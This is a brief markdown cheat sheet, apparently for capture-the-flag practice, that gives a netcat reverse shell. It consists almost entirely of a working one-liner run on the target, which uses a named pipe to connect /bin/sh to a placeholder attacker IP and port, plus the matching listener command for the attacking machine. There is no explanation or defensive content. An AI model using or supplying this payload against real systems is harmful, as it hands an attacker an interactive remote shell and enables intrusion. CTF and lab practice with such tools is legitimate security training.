# Reverse Shell Tools and Scripts for CTFs

### Netcat reverse shell

**On taget machine**
```
# on target machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
```
**On Attacking machine**
```
netcat -vlp <port>
```

